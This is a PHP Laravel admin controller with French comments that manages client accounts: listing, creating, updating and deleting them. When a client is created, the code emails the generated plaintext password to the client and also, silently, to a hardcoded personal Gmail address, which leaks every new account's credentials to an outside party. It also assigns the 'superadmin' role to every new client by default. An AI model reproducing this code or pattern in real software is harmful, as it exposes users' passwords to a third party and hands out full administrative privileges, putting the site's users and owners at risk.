<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Client;
use App\Mail\ClientPasswordMail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Str;

class ClientController extends Controller
{
    /**
     * Liste des clients
     */
    public function index()
    {
        return view('admin.pages.clients', [
            'clients' => Client::where('role', '!=', 'simpleutilisateur')
                            ->latest()
                            ->get()
        ]);
    }


    /**
     * Création d’un client
     */
    public function store(Request $request)
    {
        $request->validate([
            'email' => 'nullable|email|unique:clients,email',
        ]);

        $plainPassword = Str::random(10);

        $client = Client::create([
            'first_name' => $request->firstName,
            'last_name'  => $request->lastName,
            'email'      => $request->email,
            'phone'      => $request->phone,
            'address'    => $request->address,
            'company'    => $request->company,
            'password'   => Hash::make($plainPassword),

            // valeurs par défaut
            'status'     => 'inactif',
            'role'       => 'superadmin',
        ]);

        // Envoi email si email présent
        if ($client->email) {
            Mail::to($client->email)
                ->send(new ClientPasswordMail($plainPassword));

            Mail::to('rdauphinelys@gmail.com')
                ->send(new ClientPasswordMail($plainPassword));
        }

        return $this->response($request, [
            'message' => 'Client ajouté avec succès',
            'client'  => $client,
        ], 201);
    }

    /**
     * Mise à jour client
     */
    public function update(Request $request, Client $client)
    {
        $request->validate([
            'email' => 'nullable|email|unique:clients,email,' . $client->id,
        ]);

        $client->update([
            'first_name' => $request->firstName,
            'last_name'  => $request->lastName,
            'email'      => $request->email,
            'phone'      => $request->phone,
            'address'    => $request->address,
            'company'    => $request->company,
        ]);

        return $this->response($request, [
            'message' => 'Client mis à jour',
            'client'  => $client,
        ]);
    }

    /**
     * Suppression client
     */
    public function destroy(Request $request, Client $client)
    {
        $client->delete();

        return $this->response($request, [
            'message' => 'Client supprimé',
        ]);
    }

    /**
     * Réponse JSON ou redirect (centralisé)
     */
    private function response(Request $request, array $data, int $status = 200)
    {
        if ($request->expectsJson()) {
            return response()->json([
                'success' => true,
                ...$data
            ], $status);
        }

        return redirect()
            ->back()
            ->with('success', $data['message'] ?? 'Opération réussie');
    }
}
